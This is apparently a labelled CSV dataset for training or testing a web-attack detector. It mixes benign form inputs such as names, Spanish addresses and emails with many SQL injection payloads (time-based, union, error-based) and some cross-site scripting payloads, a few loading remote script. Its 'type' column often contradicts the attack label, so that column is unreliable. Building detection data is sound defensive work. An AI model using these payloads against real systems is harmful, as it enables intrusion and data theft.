Text,attack_type,Label,type
1') and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('mptm'='mptm,sqli,1,sql
edilnerto,norm,0,normal
kazem@cup-id.as,norm,0,normal
"1';iif(8214=4954,1,1/0)",sqli,1,sql
"1"")));select case when 6229=2077 then 1 else null end--",sqli,1,sql
15953,norm,0,normal
1) where 7050=7050;waitfor delay '0:0:5'--,sqli,1,sql
"1))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((3366=3366",sqli,1,sql
1) where 1402=1402;select sleep(5)#,sqli,1,sql
av. mar 63 10?g,norm,0,normal
"1%')) and elt(4249=4249,7259) and (('%'='",sqli,1,normal
almonacid de la sierra,norm,0,normal
"1')) union all select null,null,null,null,null,null,null,null#",sqli,1,sql
pe7tr0b9,norm,0,normal
maraa,norm,0,normal
"<style>li {list-style-image: url(""javascript:alert('xss')"");}</style><ul><li>xss",xss,2,xss
sowinetz@906.com.net,norm,0,normal
santa barbara 28,norm,0,normal
to2adora,norm,0,normal
03450,norm,0,normal
"1))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (((6312=6312",sqli,1,normal
1') where 1917=1917 union all select null#,sqli,1,sql
"1) where 6788=6788 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
3110,norm,0,normal
doroteya,norm,0,normal
4645,norm,0,normal
plebs cadevall,norm,0,normal
47609,norm,0,normal
"calle cua, 34",norm,0,normal
"1')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('teng' like 'teng",sqli,1,sql
"calle virginia wolf, 145 10-a",norm,0,normal
85009456f,norm,0,normal
1'||(select 'ucro' where 9912=9912 and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
26288,norm,0,normal
munch_velazquez@hiperzaragoza.tk,norm,0,normal
"-1504"") as wpes where 6256=6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",sqli,1,sql
cremer,norm,0,normal
-9555'))) or (8459=8459)*4906 and ((('rwpq' like 'rwpq,sqli,1,normal
1'))) and sleep(5) and ((('hwjy'='hwjy,sqli,1,normal
"1"") where 3321=3321;begin dbms_lock.sleep(5); end--",sqli,1,sql
gata,norm,0,normal
calle torreta 126 9c,norm,0,normal
donadio_honig@donkr.zr,norm,0,normal
"1',(select (case when (6948=4654) then 1 else 6948*(select 6948 from mysql.db) end))",sqli,1,sql
58c058ars4,norm,0,normal
"1%';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%'='",sqli,1,sql
deleandra,norm,0,normal
46793939w,norm,0,normal
krone,norm,0,normal
"-3109"" or elt(1032=1032,3623)",sqli,1,normal
kamil,norm,0,normal
"1"")) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
malmirada,norm,0,normal
8927148583279843,norm,0,normal
karyl,norm,0,normal
villavaquern,norm,0,normal
1'||(select 'brde' where 7390=7390 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))||',sqli,1,sql
"-3037""))) or elt(4758=9129,9129) and (((""zewv"" like ""zewv",sqli,1,normal
b66762o,norm,0,normal
bleifer@muchacha.com.bh,norm,0,normal
"<img src=""blah>"" onmouseover=""document.cookie=true;"">",xss,2,sql
reco+vero,norm,0,normal
76196535l,norm,0,normal
"-4869%' union all select 5729,5729,5729--",sqli,1,sql
eward,norm,0,normal
"paratge palmira, 112, 5-b",norm,0,normal
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'fdbm' like 'fdbm,sqli,1,sql
1455691035451783,norm,0,normal
"1 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",sqli,1,sql
87811832v,norm,0,normal
"1"") where 4971=4971 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,1,sql
1 rlike (select (case when (7689=7689) then 1 else 0x28 end))# mekk,sqli,1,sql
muoz capato,norm,0,normal
van_mete2,norm,0,normal
"c/ montealegre s/n, 9-b",norm,0,normal
-2374) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (2576=2576,sqli,1,sql
embarque,norm,0,normal
9177356763269227,norm,0,normal
edelia,norm,0,normal
c/ masca 45,norm,0,normal
"-7511)) as xqzf where 9939=9939 union all select 9939,9939,9939,9939,9939,9939,9939--",sqli,1,sql
"1')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('holo'='holo",sqli,1,sql
"1) and elt(4249=4249,7259)",sqli,1,normal
24249,norm,0,normal
4456163671536679,norm,0,normal
larisa,norm,0,normal
"-8869"" where 3019=3019 union all select 3019,3019,3019#",sqli,1,sql
"-1000"" or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""isbq""=""isbq",sqli,1,sql
"-5560"")) or 7292=6184#",sqli,1,normal
romer@pisossantcugat.iq,norm,0,normal
10750198k,norm,0,normal
01450,norm,0,normal
kunneke@storagecraft.nz,norm,0,normal
1%';select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
8812117919949504,norm,0,normal
1)));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
01169,norm,0,normal
33729,norm,0,normal
millares,norm,0,normal
"1%"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ""%""=""",sqli,1,sql
33971,norm,0,normal
"1"") and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""ynde""=""ynde",sqli,1,sql
persidsky@filtraciondehumos.md,norm,0,normal
dederika,norm,0,normal
neisy,norm,0,normal
cambre@beesmer.na,norm,0,normal
1'))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((('ywbs'='ywbs,sqli,1,sql
toribio,norm,0,normal
ojinaga bascn,norm,0,normal
38788994t,norm,0,normal
mendracaveitia torreyas,norm,0,normal
"1%"";call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
1' and (select * from (select(sleep(5)))fzno) and 'vwve' like 'vwve,sqli,1,sql
"1')) as jvwq where 6596=6596 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
9029322975173730,norm,0,normal
"1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('xikz' like 'xikz",sqli,1,normal
thibaud79,norm,0,normal
"1 where 7757=7757 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1,sql
23266,norm,0,normal
"-1<br size=""&{document.cookie=true}"">",xss,2,normal
"-4838')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
96399738e,norm,0,normal
banasts,norm,0,normal
2429988890930598,norm,0,normal
se1ns9tam9nte,norm,0,normal
1'))) and sleep(5) and ((('lbmp'='lbmp,sqli,1,normal
freeley,norm,0,normal
"1)) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((9313=9313",sqli,1,sql
frasquit,norm,0,normal
"<input type=""image"" src=""javascript:document.cookie=true;"">",xss,2,xss
"1'+(select 'uzaw' where 9900=9900 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'",sqli,1,sql
76706902q,norm,0,normal
"1"") as kndn where 9314=9314;iif(6307=2459,1,1/0)",sqli,1,sql
-9660)) or 9762=9698,sqli,1,normal
"-5866')) as phzq where 3803=3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",sqli,1,sql
ventura motn,norm,0,normal
joelynn,norm,0,normal
"<img id=xss src=""blah>""onmouseover=""alert('xss');"">",xss,2,sql
cangalaya,norm,0,normal
06044170t,norm,0,normal
2797,norm,0,normal
6190977702118960,norm,0,normal
"1"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""ekbq""=""ekbq",sqli,1,sql
santaniello_tabernero@enfuerteventura.com.ni,norm,0,normal
2618804730024814,norm,0,normal
"1'||(select 'jlon' where 1461=1461;iif(5257=5257,1,1/0)",sqli,1,sql
1'||(select 'zeet' from dual where 9567=9567 and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
6552399616832844,norm,0,normal
moscoso danot,norm,0,normal
05146,norm,0,normal
benalmdena,norm,0,normal
"1')));select * from generate_series(9709,9709,case when (9709=7795) then 1 else 0 end) limit 1--",sqli,1,sql
recital,norm,0,normal
09260,norm,0,normal
1'+(select 'tmel' where 2655=2655 rlike (select (case when (2118=8500) then 1 else 0x28 end)))+',sqli,1,sql
"1"");select sleep(5) and (""innk""=""innk",sqli,1,sql
resmini@barebackspain.yu,norm,0,normal
"1%') union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
"1"")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""vjvz"" like ""vjvz",sqli,1,sql
"<script>document.write(""<scri"");</script>pt src=""http://vulnerability-lab.com/crosssitescripting.js""></script>",xss,2,xss
1'||(select 'wadx' where 4287=4287 or sleep(5)#,sqli,1,sql
1)) as ewlg where 3722=3722 rlike sleep(5)--,sqli,1,sql
helaina,norm,0,normal
50582,norm,0,normal
20159,norm,0,normal
1' where 2911=2911;if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
rushmann@clubforex.jm,norm,0,normal
"-7083"" or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""ajcl"" like ""ajcl",sqli,1,sql
"1' in boolean mode) or elt(5873=5873,sleep(5))#",sqli,1,normal
33652854j,norm,0,normal
ensaa6o,norm,0,normal
agullana,norm,0,normal
ensacad$ora,norm,0,normal
1));begin user_lock.sleep(5); end--,sqli,1,sql
"1"" and (7424=2381)*2381 and ""dvju""=""dvju",sqli,1,normal
4662359455480921,norm,0,normal
"-8331') union all select 1452,1452,1452,1452,1452--",sqli,1,sql
robin@comerciosdeaspe.info,norm,0,normal
"1 where 1326=1326 union all select null,null,null,null,null,null--",sqli,1,sql
"1,(case when 8260=8260 then 1 else null end)",sqli,1,normal
30150469e,norm,0,normal
7497,norm,0,normal
pirotto nin,norm,0,normal
"pl. santa isabel s/n, 8-d",norm,0,normal
malave dehesa,norm,0,normal
sitiwet-chagas@creacionesacampada.travel,norm,0,normal
e1bud8,norm,0,normal
c/ pereiras 149,norm,0,normal
1 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),sqli,1,sql
04087524x,norm,0,normal
"c/ 19 s/n, 9e",norm,0,normal
1'+(select soqk where 5383=5383;select pg_sleep(5)--,sqli,1,sql
basilia,norm,0,normal
1' and 4374=2305,sqli,1,normal
"-4686"") as dxks where 7123=7123 or elt(1032=1032,3623)--",sqli,1,sql
"<img dynsrc=""javascript:alert('crosssitescripting')"">",xss,2,xss
94cl09at8va,norm,0,normal
"1"" where 4808=4808 union all select null,null,null,null,null,null,null#",sqli,1,sql
6410439898425847,norm,0,normal
lugo,norm,0,normal
2875083717333458,norm,0,normal
fabiola,norm,0,normal
"1""))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((""eslj"" like ""eslj",sqli,1,sql
8877423403591607,norm,0,normal
-5369') or 3208=6669#,sqli,1,normal
-5116) or (8287=4930)*4930,sqli,1,normal
3927,norm,0,normal
"1"" and 6637=2321",sqli,1,normal
"1%""))) or 4240=(select 4240 from pg_sleep(5))--",sqli,1,sql
9ig7a2i4,norm,0,normal
nrez muriscot,norm,0,normal
"1"";select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)-- jdia,sqli,1,sql
bette,norm,0,normal
ulldemolins,norm,0,normal
edelweis,norm,0,normal
pinatero,norm,0,normal
mariabel,norm,0,normal
00915989z,norm,0,normal
pacn,norm,0,normal
"mesonero romanos, s/n, 2?b",norm,0,normal
poderdante,norm,0,normal
"-4127%' union all select 9558,9558,9558#",sqli,1,sql
"-8491"" where 9043=9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--",sqli,1,sql
32027973j,norm,0,normal
calle lindachiquia 141 3?e,norm,0,normal
"plaza pont 47, 6?e",norm,0,normal
03171335a,norm,0,normal
.11ne5o,norm,0,normal
-6777%') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('%'=',sqli,1,sql
93,norm,0,normal
5n37do,norm,0,normal
5ecom058a?8a,norm,0,normal
"1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((('qhgp'='qhgp",sqli,1,sql
"1%""))) or (select * from (select(sleep(5)))ydpu) and (((""%""=""",sqli,1,sql
"1) as adzj where 5575=5575 or 8421=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1'+(select syrz where 7699=7699 union all select null,null,null#",sqli,1,sql
"1) where 5615=5615 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",sqli,1,sql
34473,norm,0,normal
1631,norm,0,normal
1' or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
"-9315'))) union all select 5057,5057,5057,5057,5057#",sqli,1,sql
"-1<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting",xss,2,xss
2isopada,norm,0,normal
desnarigada,norm,0,normal
49159005r,norm,0,normal
"1)) union all select null,null,null,null,null,null--",sqli,1,sql
"1'+(select hsef where 4136=4136 or 8421=(select count(*) from generate_series(1,5000000)))+'",sqli,1,sql
"-8093"")) as oboi where 1476=1476 union all select 1476,1476,1476,1476#",sqli,1,sql
marmolejos,norm,0,normal
sheree,norm,0,normal
temple@fernandosoto.ch,norm,0,normal
"secuita, la",norm,0,normal
"-2962'))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('hkjo'='hkjo",sqli,1,sql
"-7531'))) union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",sqli,1,sql
8641505731046514,norm,0,normal
verde,norm,0,normal
ortigosa de cameros,norm,0,normal
castell d'empries,norm,0,normal
oropesa del mar/orpesa,norm,0,normal
21710,norm,0,normal
"-3437) union all select 7774,7774,7774--",sqli,1,sql
teintinger@underdog.cl,norm,0,normal
eden,norm,0,normal
1'||(select 'yydv' from dual where 9639=9639;select case when 8514=3207 then 1 else null end--,sqli,1,sql
1359601780395622,norm,0,normal
"1';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'tmdj' like 'tmdj",sqli,1,sql
"1%')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('%'='",sqli,1,sql
"1,(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4250=4250) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",sqli,1,sql
"-6155%')) union all select 2421,2421,2421,2421,2421#",sqli,1,sql
ojn,norm,0,normal
46712,norm,0,normal
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('lxoc'='lxoc",sqli,1,sql
c40tra3el436,norm,0,normal
1%';select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
1%') and (7704=3494)*3494 and ('%'=',sqli,1,normal
"1))) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"1 union all select null,null--",sqli,1,sql
"grupos coronel ruiz de toledo 121, 9g",norm,0,normal
matilla la seca,norm,0,normal
song@eyewear.nom.aw,norm,0,normal
mantero gudall,norm,0,normal
7263031959103699,norm,0,normal
"1%"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""%""=""",sqli,1,sql
24226,norm,0,normal
1'))) and 8162=1687 and ((('tdyr' like 'tdyr,sqli,1,normal
"1%'))) union all select null,null,null#",sqli,1,sql
-3750'+(select alpu where 3911=3911 order by 1--,sqli,1,sql
"1))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((3504=3504",sqli,1,sql
trissenaar@tetdevelocidad.uk,norm,0,normal
"1"") where 4905=4905 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
"1"";iif(2084=5671,1,1/0)",sqli,1,sql
"c/ eulogio serdan, 139 5a",norm,0,normal
"<style>@im\\port'\\ja asc ipt:alert(""xss"")';</style>",xss,2,sql
34886,norm,0,normal
"1%"");call regexp_substring(repeat(right(char(3702),0),500000000),null) and (""%""=""",sqli,1,sql
golpeadura,norm,0,normal
lehrer@didacramirez.sb,norm,0,normal
1019,norm,0,normal
"-2876"") or make_set(5306=6127,6127) and (""urjm""=""urjm",sqli,1,normal
"1)(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",sqli,1,sql
0462514258960948,norm,0,normal
"-1868)) union all select 1859,1859--",sqli,1,sql
dudas,norm,0,normal
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('tkcy' like 'tkcy",sqli,1,sql
-2527)) as oqpy where 7468=7468 or 3038=3038,sqli,1,normal
dionio,norm,0,normal
arroldo,norm,0,normal
guilbauth iglsia,norm,0,normal
1') where 3861=3861;select pg_sleep(5)--,sqli,1,sql
licinio,norm,0,normal
4291273223594568,norm,0,normal
e97rep70rn*as,norm,0,normal
"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('kpsg' like 'kpsg",sqli,1,normal
"<img style=""crosssitescripting:expr/*crosssitescripting*/ession(alert('crosssitescripting'))"">",xss,2,sql
"1) as guru where 7615=7615 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
nahid,norm,0,normal
-8538%' or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and '%'=',sqli,1,sql
sadurn corvera,norm,0,normal
armengol sieira,norm,0,normal
29127,norm,0,normal
"1%"" and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ""%""=""",sqli,1,sql
"1%"";select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1'+(select uqdb where 3508=3508 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
fournier,norm,0,normal
-6100') as kvfc where 2377=2377 or 6872=6872--,sqli,1,sql
8336103681905855,norm,0,normal
cantbrico,norm,0,normal
turcia,norm,0,normal
carron,norm,0,normal
40290,norm,0,normal
25245,norm,0,normal
benasque,norm,0,normal
carmena,norm,0,normal
"1%"")) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
7ans286,norm,0,normal
bnrinfo,norm,0,normal
afelpar,norm,0,normal
1%') or (select * from (select(sleep(5)))ydpu) and ('%'=',sqli,1,sql
"1')) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('dssx' like 'dssx",sqli,1,sql
kulman,norm,0,normal
beaudine@barnizultravioleta.sz,norm,0,normal
on,norm,0,normal
0esino1o,norm,0,normal
"veronica 126,",norm,0,normal
1%' rlike (select (case when (3596=4245) then 1 else 0x28 end)) and '%'=',sqli,1,sql
grijota,norm,0,normal
misko,norm,0,normal
"1"")));select pg_sleep(5)--",sqli,1,sql
"ignacio aldecoa, 30, 6h",norm,0,normal
2ea6on9s,norm,0,normal
05309,norm,0,normal
brozas,norm,0,normal
1) and 6969=(select 6969 from pg_sleep(5)),sqli,1,sql
"1')) as hbdi where 6758=6758 and elt(1210=1210,sleep(5))--",sqli,1,sql
39960501w,norm,0,normal
"1%""));select (case when (9393=5530) then 9393 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
terrateig,norm,0,normal
kavid,norm,0,normal
"1"" where 7739=7739 and sleep(5)--",sqli,1,sql
71196230y,norm,0,normal
ambrosi,norm,0,normal
1'+(select bjav where 6923=6923 and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
1);select pg_sleep(5) and (1044=1044,sqli,1,sql
manguita,norm,0,normal
(select (case when (9263=9263) then 1 else 9263*(select 9263 from mysql.db) end)),sqli,1,sql
9620,norm,0,normal
tarp@redstarz.asia,norm,0,normal
halstan@guerrerodelbienestar.sh,norm,0,normal
"c/ caamaque, 15, 4-g",norm,0,normal
98058748l,norm,0,normal
"-2373%"") or 9323=9323#",sqli,1,normal
galacho,norm,0,normal
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""mpxd"" like ""mpxd",sqli,1,sql
"1"") where 9861=9861;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
"-1641'||(select 'jfnu' where 7682=7682 union all select 7682,7682,7682--",sqli,1,sql
lauro,norm,0,normal
"-4694') where 1501=1501 union all select 1501,1501,1501,1501,1501,1501#",sqli,1,sql
keaton3,norm,0,normal
0518984611180264,norm,0,normal
"1%"")) union all select null#",sqli,1,sql
"1%""));select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
05636576n,norm,0,normal
"1%' and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1%')) union all select null,null,null,null,null#",sqli,1,sql
53238791r,norm,0,normal
cr4ito,norm,0,normal
"1')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('zjnp'='zjnp",sqli,1,sql
opinable,norm,0,normal
"1"";begin dbms_lock.sleep(5); end and ""xlvn""=""xlvn",sqli,1,sql
"1""))) waitfor delay '0:0:5' and (((""tuhy"" like ""tuhy",sqli,1,normal
(2329=4209)*1,sqli,1,normal
"de santiago carrillo solares 67, 8-f",norm,0,normal
"-1922%') union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",sqli,1,sql
"1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('gcna'='gcna",sqli,1,sql
223v35o,norm,0,normal
5013,norm,0,normal
03266253t,norm,0,normal
"-6442""))) or 3038=3038",sqli,1,normal
"1"")) and (3020=3020)*6703 and ((""bely""=""bely",sqli,1,normal
"1"") as pobe where 1704=1704;begin dbms_lock.sleep(5); end--",sqli,1,sql
09ca93a4i9lar,norm,0,normal
28749,norm,0,normal
"1'))) union all select null,null,null,null,null,null--",sqli,1,sql
"cuesta sal, 171, 5?a",norm,0,normal
aduna,norm,0,normal
philip7,norm,0,normal
1002172418275885,norm,0,normal
48277,norm,0,normal
55609751y,norm,0,normal
44707,norm,0,normal
"1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'ankn'='ankn",sqli,1,sql
"talavera 56,",norm,0,normal
"1%' and elt(3114=3114,sleep(5))#",sqli,1,normal
porta catorce 60 6?f,norm,0,normal
7964,norm,0,normal
5405560424744158,norm,0,normal
ibias,norm,0,normal
<script src=http://vulnerability-lab.com/crosssitescripting.js?<b>,xss,2,normal
"1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,1,sql
4535499067699743,norm,0,normal
"1 where 1153=1153 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",sqli,1,sql
-4557 or 6872=6872-- kkte,sqli,1,sql
7092,norm,0,normal
kirkpatr,norm,0,normal
"calle da unidade, 184 7e",norm,0,normal
"1"") as xsgx where 5239=5239 union all select null,null--",sqli,1,sql
victorino,norm,0,normal
ryall,norm,0,normal
1152,norm,0,normal
"1' and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and 'rupq'='rupq",sqli,1,normal
villalba de la loma,norm,0,normal
salip altares,norm,0,normal
"1""))) and 6969=(select 6969 from pg_sleep(5)) and (((""rsru""=""rsru",sqli,1,sql
apresivamente,norm,0,normal
myranda,norm,0,normal
daniza,norm,0,normal
salido,norm,0,normal
calle fama 115 10g,norm,0,normal
+payar,norm,0,normal
xaviera,norm,0,normal
"calle mayor, s/n 11h",norm,0,normal
2a6in6rosa,norm,0,normal
superable,norm,0,normal
"-3349))) union all select 6553,6553#",sqli,1,sql
1' and 1661=1244 and 'dcha'='dcha,sqli,1,normal
lauze,norm,0,normal
"1"")) as fjtv where 8904=8904;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
53486450l,norm,0,normal
"1"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (""tlbp""=""tlbp",sqli,1,sql
1'+(select 'xpby' where 2724=2724;select (case when (9376=4521) then 1 else 9376*(select 9376 from master..sysdatabases) end)--,sqli,1,sql
villagomez@nutrimama.uy,norm,0,normal
fruslera,norm,0,normal
"1')) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('rdpv'='rdpv",sqli,1,sql
29719,norm,0,normal
loke,norm,0,normal
